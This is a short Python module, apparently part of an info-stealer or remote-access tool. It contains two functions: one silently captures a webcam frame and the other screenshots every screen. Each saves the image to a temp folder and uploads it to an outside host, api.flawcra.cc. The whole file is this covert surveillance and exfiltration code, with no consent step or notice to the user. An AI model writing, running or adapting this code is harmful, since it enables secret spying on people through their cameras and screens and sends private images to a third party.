import os

import cv2
import requests
from PIL import ImageGrab


def getwebcam(tempdir):
    cam = cv2.VideoCapture(0)
    ret, frame = cam.read()
    path = os.path.join(tempdir, "webcam.png")
    cv2.imwrite(path, frame)
    cam.release()
    with open(path, 'rb') as f:
        r = requests.post('https://api.flawcra.cc/cdn/', files={'file': f})
    return r.json()


def getscreenshot(tempdir):
    thescreenshot = ImageGrab.grab(all_screens=True)
    path = os.path.join(tempdir, "desktop.png")
    thescreenshot.save(path, 'PNG')
    with open(path, 'rb') as f:
        r = requests.post('https://api.flawcra.cc/cdn/', files={'file': f})
    return r.json()
